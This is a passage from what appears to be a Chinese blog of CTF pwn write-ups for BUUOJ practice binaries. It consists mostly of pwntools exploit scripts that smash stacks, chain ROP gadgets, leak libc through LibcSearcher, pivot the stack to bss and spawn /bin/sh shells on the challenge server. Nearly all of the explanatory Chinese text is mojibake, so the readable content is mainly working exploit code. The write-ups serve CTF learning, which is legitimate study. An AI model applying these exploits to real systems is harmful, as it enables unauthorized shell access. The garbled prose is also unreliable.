<span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26867</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br><span class="hljs-comment">#æ•´ç†ä»¥ä¸‹æ€è·¯ï¼š45ä¸ªæ•°ç»„å…ˆè¦†ç›–æ‰ï¼Œç„¶åæ˜¯get_secrtåœ°å€ï¼Œç„¶åæ˜¯writeåœ°å€ï¼Œ</span><br><span class="hljs-comment">#writeçš„è¿”å›åœ°å€ï¼ˆæ„Ÿè§‰å¾—æ˜¯exitçš„åœ°å€ï¼‰ï¼Œç¬¬ä¸€ä¸ªå‚æ•°1ï¼Œç¬¬äºŒä¸ª0x80ECA2Dï¼Œç¬¬ä¸‰ä¸ª50å­—èŠ‚ï¼ˆå°±è¿™ä¹ˆé•¿)</span><br><span class="hljs-comment">#è¿˜æ˜¯printfå‡½æ•°çš„å‚æ•°ç®€å•ä¸€ç‚¹</span><br>elf = ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>, <span class="hljs-number">0</span>)<br>exit = elf.symbols[<span class="hljs-string">&quot;exit&quot;</span>]<br><span class="hljs-comment">#write = elf.symbols[&quot;write&quot;]</span><br>printf = elf.symbols[<span class="hljs-string">&quot;printf&quot;</span>]<br>get = elf.symbols[<span class="hljs-string">&quot;get_secret&quot;</span>]<br>buf = <span class="hljs-number">0x80ECA2D</span><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">45</span>, get, printf, exit, buf])<br>sl(payload)<br>ra()<br></code></pre></div></td></tr></table></figure><h2 id="8-bjdctf-2020-babystack"><a href="#8-bjdctf-2020-babystack" class="headerlink" title="8.bjdctf_2020_babystack"></a>8.bjdctf_2020_babystack</h2><ul><li>æ¯”è¾ƒç®€å•, ä¸»è¦çš„é—®é¢˜æ˜¯contextçš„é»˜è®¤bitæ˜¯32, æ¢æˆä¸‡èƒ½å¤´çš„context.binaryå°±æ²¡æœ‰é—®é¢˜äº†</li></ul><h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9.ciscn_2019_ne_5"></a>9.ciscn_2019_ne_5</h2><p>è¿‡ç¨‹<a href="https://www.freesion.com/article/93161361727/">[0]</a>.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./ciscn_2019_ne_5&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28273</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_ne_5&quot;</span>)<br><span class="hljs-comment">#æ€è·¯ï¼šå…ˆaddlogå†™å…¥128å­—èŠ‚çš„srcï¼Œä¸‹ä¸€æ¬¡å¾ªç¯åˆ°getfalgé‡Œé¢ç”¨strcpyå†™å…¥destå®ç°æº¢å‡ºï¼Œè¿”å›åœ°å€sysï¼Œsysè¿”å›åœ°å€éšæ„ï¼Œsyså‚æ•°ä¸ºshåœ°å€</span><br>elf = ELF(<span class="hljs-string">b&quot;./ciscn_2019_ne_5&quot;</span>, <span class="hljs-number">0</span>)<br>sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh&quot;</span>))<span class="hljs-comment">#å¯ä»¥ç›´æ¥ç”¨ELF.search, æˆ–è€…ROPgadget --binary &quot;&quot; --string &quot;&quot;</span><br>sys = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>, sh])<br><span class="hljs-comment">#sla(b&#x27;password:&#x27;, b&#x27;administrator&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;1&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;info:&#x27;, payload)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;4&#x27;)</span><br>sl(<span class="hljs-string">b&#x27;administrator&#x27;</span>)<span class="hljs-comment">#åªè¦æå¾—æ¸…æ¥š, ç›´æ¥åªç”¨sendline(), åªæ˜¯è°ƒè¯•æœ‰ç‚¹ä¹±è€Œå·²(ä¹Ÿè¿˜å¥½, ç°åœ¨çš„è¾“å…¥ä¹Ÿä¸ä¼šå¤ªå¤š)</span><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sl(payload)<br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#sl(b&#x27;administrator\n1\n&#x27;+payload+b&#x27;\n4&#x27;)ç”šè‡³å¯ä»¥å†™æˆ</span><br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10. others_shellcode_"></a>10. others_shellcode_</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">__asm &#123; <span class="hljs-keyword">int</span> <span class="hljs-number">80</span>h; LINUX - sys_execve &#125; <span class="hljs-comment">//tmdè¿™åˆæ˜¯å“ªé—¨å­çš„LINUX</span><br></code></pre></div></td></tr></table></figure><p>p.s. å…³äº__asm <a href="https://docs.microsoft.com/en-us/cpp/assembler/inline/asm?view=msvc-160">[0]</a>.</p><p>ä¹‹å‰åˆ·é¢˜ä¸­ç”¨åˆ°çš„åé—¨å‡½æ•°éƒ½æ˜¯system(â€œ/bin/shâ€)ï¼Œè¿™æ¬¡å‡ºç°äº†ä¸€ä¸ªæ–°çš„åé—¨ï¼š**execve()**ã€‚</p><p>å‡½æ•°å®šä¹‰:<br>**int execve(const char *filename, char <em>const argv[ ], char <em>const envp[ ]);</em></em> </p><p>å¯„å­˜å™¨eaxæ”¾execveçš„ç³»ç»Ÿè°ƒç”¨å·11ï¼›<br>å¯„å­˜å™¨ebxæ”¾æ–‡ä»¶è·¯å¾„ï¼Œå³ç¬¬ä¸€ä¸ªå‚æ•°ï¼›<br>å¯„å­˜å™¨ecxæ”¾ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ˜¯åˆ©ç”¨æ•°ç»„æŒ‡é’ˆæŠŠå†…å®¹ä¼ é€’ç»™æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”éœ€è¦ä»¥ç©ºæŒ‡é’ˆ(NULL)ç»“æŸï¼›<br>å¯„å­˜å™¨edxæ”¾æœ€åä¸€ä¸ªå‚æ•°ï¼Œä¸ºä¼ é€’ç»™æ‰§è¡Œæ–‡ä»¶çš„æ–°ç¯å¢ƒå˜é‡æ•°ç»„ã€‚</p><p><strong>åä¸¤ä¸ªå‚æ•°ä¸€èˆ¬ä¸º0</strong> </p><p>int 0x80ï¼šä¸­æ–­<br>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨å‡½æ•°execve()æ—¶ï¼Œexecve()é€šè¿‡int 0x80æŒ‡ä»¤è¿›å…¥ç³»ç»Ÿè°ƒç”¨å…¥å£ç¨‹åºï¼Œå¹¶ä¸”æŠŠç³»ç»Ÿè°ƒç”¨å·11æ”¾å…¥eaxä¸­ï¼Œæ¥ç€æŠŠå‚æ•°æ”¾å…¥ebxï¼Œecxå’Œedxä¸­ã€‚å¦‚æœæ²¡æœ‰/bin/shå­—ç¬¦ä¸², é‚£ä¹ˆå°±å…ˆè°ƒç”¨readå‡½æ•°è¯»å–â€/bin/shâ€, å°è¯•â€shâ€å¤±è´¥, åŸå› å°šæœªçŸ¥æ™“</p><h2 id="11-2018-rop"><a href="#11-2018-rop" class="headerlink" title="11.2018_rop"></a>11.2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">setresuid(); <br>setresgid();<br><span class="hljs-comment">//These two syscalls are like their equivalent kernels calls above, but with the additional ability to set the Saved-User-ID (SUID) or Saved-Group-ID (SGID). re represent</span><br></code></pre></div></td></tr></table></figure><h2 id="12-ciscn-s-3"><a href="#12-ciscn-s-3" class="headerlink" title="12.ciscn_s_3"></a>12.ciscn_s_3</h2><ol><li><p>checksec</p><p><img src="https://i.loli.net/2021/08/06/Exk1cpHYvmls4fJ.png" alt="image-20210806154145249"></p></li><li><p>mainå‡½æ•°é‡Œé¢åªæœ‰vuln, vulnå‡½æ•°é‡Œå°±æ˜¯ç®€å•çš„sysread syswrite, éƒ½æ˜¯é€šè¿‡syscallä»¥åŠç³»ç»Ÿè°ƒç”¨å·æ¥æ‰§è¡Œçš„</p><img src="https://i.loli.net/2021/08/06/SP7dTJbw4XCQBDm.png" alt="image-20210806154501028" style="zoom:80%;" /> <p>gadgetså‡½æ•°:</p><img src="https://i.loli.net/2021/08/06/OiYpf1UhETLPwo5.png" alt="image-20210806154658559" style="zoom:80%;" /> </li><li><p>æœ€é‡è¦çš„ä¸¤ç‚¹</p><ul><li>è¿™ä¸¤ä¸ªå‡½æ•°<strong>éƒ½ä¸ä»¥leaveç»“å°¾</strong>, æ„å‘³ç€å‡½æ•°ç»“æŸåæ²¡æœ‰æ¢å¤åˆ°ä¹‹å‰çš„æ ˆå¸§, è¿›å…¥å‡½æ•°æ—¶çš„ebpçš„ä½ç½®å³ä¸ºè¿”å›åœ°å€, æ‰€ä»¥IDAä¸­æ ˆåˆ†ææ˜¯é”™è¯¯çš„, <strong>çœŸå®æ ˆç»“æ„è¿˜å¾—çœ‹æ±‡ç¼–ä»£ç </strong> </li><li><strong>ç¬¬ä¸€ç§åŠæ³•:</strong> çœ‹è§äº†ä¸€ä¸ªmov rax, <strong>3B</strong>h    retn, ä»£è¡¨ç€æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤è¡Œä»£ç ä¸ºæ‰§è¡Œsys_execveåšå‡†å¤‡</li><li><strong>ç¬¬äºŒç§åŠæ³•:SROP</strong> </li><li>ä¸‹é¢å…ˆç”¨ç¬¬ä¸€ç§æ–¹æ³•.</li></ul></li><li><p>ä»åæ±‡ç¼–ä»£ç ä¸­çœ‹å‡ºsys_readå‡ ä¹æ— é™é•¿å­—èŠ‚(0x400), sys_write30ä¸ªå•ä½, æœ‰æ˜æ˜¾çš„æ ˆæº¢å‡º, è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨59å·ç³»ç»Ÿè°ƒç”¨(64ä½), æ„é€ </p><p><code>execve(&#39;/bin/sh&#39;ï¼Œ0ï¼Œ0ï¼‰</code> </p><p>ä½†æ˜¯ç¨‹åºä¸­å¹¶æœªå‘ç°/bin/sh, æ‰€ä»¥éœ€è¦æ‰‹åŠ¨è¾“å…¥, æ–°é—®é¢˜æ˜¯sys_readå<strong>æˆ‘ä»¬çš„å­—ç¬¦ä¸²</strong>åœ¨ä»€ä¹ˆåœ°å€ä¸Š? æ‰€ä»¥éœ€è¦<strong>leak</strong>å‡ºæŸä¸€ä¸ªæœ‰ç”¨çš„åœ°å€</p></li><li><p>gdbè°ƒè¯•:</p><p>b vuln-&gt;run-&gt;continue-&gt; aaaaaaaaa(æµ‹è¯•è¾“å…¥)-&gt;å‘ç°æ ˆçš„<u>åŸºåœ°å€</u> </p><ul><li><p>ä¸å¾—ä¸è¯´çš„å°±æ˜¯è¿™ä¸ª<strong>æ ˆçš„åŸºåœ°å€</strong>, ä¸€èˆ¬æ˜¯mainå‡½æ•°å‚æ•°ä¸­argv[0]å³æ–‡ä»¶çš„è·¯å¾„, gdbä¸­ä¼šå†™æˆè¿™ä¸ªæ ·å­</p><p> <code>0xffffd0ec â€”â–¸ 0xffffd204 â€”â–¸ 0xffffd3c4 â—‚â€” &#39;/root/Desktop/fm&#39;</code> </p><p> å–ç¬¬ä¸€æ¬¡è§£å¼•ç”¨çš„åœ°å€å³ä¸ºæ ˆçš„åŸºåœ°å€, å‡å»rspå¾—åˆ°<strong>0x118</strong> </p><p> æ ˆçš„åŸºåœ°å€é•¿è¿™æ ·å­, æœ‰pathçš„é‚£æ¡å°±æ˜¯, ä¸‹é¢ä¸€å¤§ä¸²çš„æ˜¯ç¯å¢ƒå˜é‡envp</p> <img src="https://i.loli.net/2021/08/06/R2XcmJiCe7lG3Lo.png" alt="image-20210806235944050" style="zoom: 80%;" /> </li></ul></li><li><p><strong>è¦æ³¨æ„çš„æ˜¯,</strong> popæŒ‡ä»¤å¼¹å‡ºçš„æ˜¯æ ˆä¸ŠæŒ‡é’ˆå¯¹åº”åœ°å€çš„æ•°æ®, å¹³æ—¶æ ˆæº¢å‡ºå¡«å……çš„å¾ˆå®¹æ˜“ä»¥ä¸ºç›´æ¥å°±æ˜¯æ•°æ®, å®é™…ä¸Šåœ¨è¿™ç§æƒ…å†µä¸‹åº”è¯¥å†™æˆä¸€ä¸ªåœ°å€, æŒ‡å‘payloadä¸­åé¢çš„å‚æ•°, å¦‚ä¸‹sh+0x50æŒ‡å‘mov_rax</p><p><img src="https://i.loli.net/2021/08/07/j9ZSDorqgbEfGvy.png"> </p></li><li><p>è¯¦ç»†æ³¨é‡Š:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import*</span><br>context.binary = <span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span><br>context.log_level= <span class="hljs-string">&#x27;debug&#x27;</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>rn=<span class="hljs-keyword">lambda</span> x:io.recv (x)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, xxxxx)<br>vuln=<span class="hljs-number">0x4004ed</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br>csu_end=<span class="hljs-number">0x40059a</span><br>csu_front=<span class="hljs-number">0x400580</span><br>mov_rax=<span class="hljs-number">0x4004e2</span><br>syscall=<span class="hljs-number">0x400517</span><br><span class="hljs-comment">#ç¬¬ä¸€æ¬¡çš„ç›®çš„æ˜¯leakåŸºåœ°å€, å¡«ä¸Šæ•°ç»„çš„16å­—èŠ‚å³å¯, è¿”å›åœ°å€ç»§ç»­å›åˆ°vuln</span><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(vuln)<br>sl(payload)<br>rn(<span class="hljs-number">0x20</span>)<br>binsh=u64(rn(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span><br><span class="hljs-comment">#        è¾“å…¥binsh     å¡«å®Œæ•°ç»„  å³csuend      å³mov_raxåœ°å€   rbx,rbpå¡«ä¸º0    r13-r15å…¨ä¸º0</span><br>payload= <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>+ p64(<span class="hljs-number">0</span>)+  p64(csu_end)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+      p64(binsh+<span class="hljs-number">0x50</span>)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br><span class="hljs-comment">#å³csufront     ROPgadget    execveé¦–å‚æ•°  movç³»ç»Ÿè°ƒç”¨å·   æœ€åsyscall59æ‰§è¡Œexecve   </span><br>+p64(csu_front)+p64(pop_rdi)+p64(binsh)+  p64(mov_rax)+  p64(syscall) <br><br>sl(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p> <strong>é™„: SROP<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">[CTF-WiKi]</a></strong> <strong>[<a href="https://blog.csdn.net/qinying001/article/details/104291387">writeup</a>]</strong> </p><ul><li><p>ç®€å•è¯´æ¥SROPå°±æ˜¯è°ƒç”¨sigreturnå‡½æ•°æ”¹å†™æ‰€æœ‰å¯„å­˜å™¨çš„å€¼, ç„¶åå†æ‰§è¡ŒripæŒ‡å‘çš„åœ°å€</p><p>æœ¬é¢˜ä¸­æµç¨‹ä¸º: æ³„éœ²æ ˆåŸºåœ°å€-&gt;æ„é€ frame = SigreturnFrame()-&gt;å¡«æ»¡æ•°ç»„, movè°ƒç”¨å·15, syscallåœ°å€, bytes(frame)</p></li></ul><h2 id="13-babyheap-0ctf-2017"><a href="#13-babyheap-0ctf-2017" class="headerlink" title="13.babyheap_0ctf_2017"></a>13.babyheap_0ctf_2017</h2><p>çœ‹äº†è€åŠå¤©æºä»£ç å’ŒåŸºç¡€çŸ¥è¯†</p><p>ä¼°æ‘¸ç€æˆ‘å¾—è¿‡å‡ å¤©å¤ä¹ å¤ä¹ , å¯ä¸èƒ½å¿˜è®°äº†</p><p><a href="https://blog.csdn.net/huzai9527/article/details/114807930?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.base&spm=1001.2101.3001.4242">åˆ«äººçš„è¯¦ç»†çš„wp</a>  <a href="https://bbs.pediy.com/thread-223461.htm">çœ‹é›ª ä¸å¤ªè¯¦ç»†</a> </p><h2 id="14-Black-Watch-å…¥ç¾¤é¢˜-PWN"><a href="#14-Black-Watch-å…¥ç¾¤é¢˜-PWN" class="headerlink" title="14.[Black Watch å…¥ç¾¤é¢˜]PWN"></a>14.[Black Watch å…¥ç¾¤é¢˜]PWN</h2><p>åˆæ˜¯ä¸€ç§æ²¡è§è¿‡çš„æ–¹æ³•, åä¸º<strong>æ ˆè½¬ç§»</strong>, ç”¨äºæ ˆæº¢å‡ºä¸å¤Ÿ, ä»¥leave retç»“å°¾, æœ‰æˆ–èƒ½å¤Ÿå‘bssæ®µå†™å…¥æ•°æ®çš„, å°†<strong>rsp</strong>è½¬ç§»åˆ°<strong>bss</strong>æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">leave = mov rsp, rbp pop rbp    <br>ret =  pop rip<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs flow">st=&gt;parallel: æµç¨‹:<br>opa1=&gt;start: å¡«æ»¡æ ˆä¸Šæ•°ç»„, <br>è¦†ç›–ebpä¸ºbssæ®µæŸä¸€åœ°å€<br>opa2=&gt;start: ä¿®æ”¹è¿”å›åœ°å€ä¸ºleave&amp;retçš„gadget<br>opb1=&gt;start: å¾€bsså†™å…¥4å­—èŠ‚æ•°æ®ä½œä¸ºç¬¬äºŒæ¬¡ pop rbp<br>opb2=&gt;start: å¦‚æœæœªçŸ¥sys,/bin/shç­‰åœ°å€<br>å¯ç”¨æ­¤æ¬¡leakåœ°å€ç„¶ååœ¨ä¸‹ä¸€æ¬¡æ‰§è¡Œsystemå‡½æ•°<br>a=&gt;parallel: ç»“æŸ<br>st(path1, left)-&gt;opa1-&gt;opa2<br>st(path2, right)-&gt;opb1-&gt;opb2<br>opa2-&gt;a<br>opb2-&gt;a<br><br></code></pre></div></td></tr></table></figure><p>â€¦</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;./spwn&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25611</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;spwn&quot;</span>)<br><br>bss_s = <span class="hljs-number">0x0804A300</span><span class="hljs-comment">#å°†fakeæ ˆè¿ç§»åˆ°bssä¸­</span><br>leave_ret = <span class="hljs-number">0x08048511</span><span class="hljs-comment">#æ ˆè¿ç§»æ‰€éœ€è¦çš„çš„åœ°å€</span><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#pltè¡¨å¯ä»¥è°ƒç”¨writeå‡½æ•°</span><br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#gotè¡¨é‡Œæœ‰writeå‡½æ•°çš„çœŸå®åœ°å€</span><br>main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<span class="hljs-comment">#æ§åˆ¶å‡½æ•°æ‰§è¡Œæµéœ€è¦å†æ¬¡å›åˆ°ä¸»å‡½æ•°</span><br><span class="hljs-comment"># éœ€è¦æ‰“å°å‡ºwriteçš„çœŸå®åœ°å€æŸ¥å‡ºï¼Œå¹¶ä¸”è®©å‡½æ•°å†æ¬¡è¿”å›ä¸»å‡½æ•°</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><span class="hljs-comment"># ä¸Šé¢å°†ä¸€äº›æ‰§è¡Œæµç¨‹å†™å…¥äº†bssæ®µ</span><br><span class="hljs-comment"># æ¥ä¸‹æ¥çš„å†™å…¥çš„bufåœ¨æ ˆä¸Šï¼Œæ‰€ä»¥å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œåˆ°bssæ®µ</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> <span class="hljs-comment">#è¿™ä¸ªpayloadæ˜¯å†™åˆ°æ ˆä¸Šè¿›è¡Œæ ˆè¿ç§»çš„ï¼Œæ‰€ä»¥å…ˆå¡«å……åˆ°ebpä¹‹å‰</span><br>payload += p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>)) <span class="hljs-comment">#æ¥æ”¶æ³„éœ²çš„åœ°å€</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>, write_addr) <span class="hljs-comment">#åˆ©ç”¨LibcSearcherå‡½æ•°å¯ä»¥æ ¹æ®æ³„éœ²çš„åœ°å€æ‰¾åˆ°ç›¸åº”çš„libcç‰ˆæœ¬</span><br>libc_base = write_addr - libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<span class="hljs-comment">#è·å–libcçš„åŸºåœ°å€</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment"># ç¬¬ä¸€æ¬¡æ‰§è¡Œå¾—åˆ°systemå‡½æ•°åœ°å€åæ¥ä¸‹æ¥ä¼šå†æ¬¡æ‰§è¡Œmainå‡½æ•°</span><br><span class="hljs-comment"># åœ¨è¿™æ¬¡æœ‰systemå‡½æ•°çš„æƒ…å†µä¸‹å†æ¬¡è¿›è¡Œç›¸åŒçš„æ ˆè¿ç§»æ‰§è¡Œsystem(&#x27;/bin/sh&#x27;)</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)<br>payload += p32(binsh_addr)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> + p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="15-easyheap"><a href="#15-easyheap" class="headerlink" title="15.easyheap"></a>15.easyheap</h2><p><strong>exp:</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span 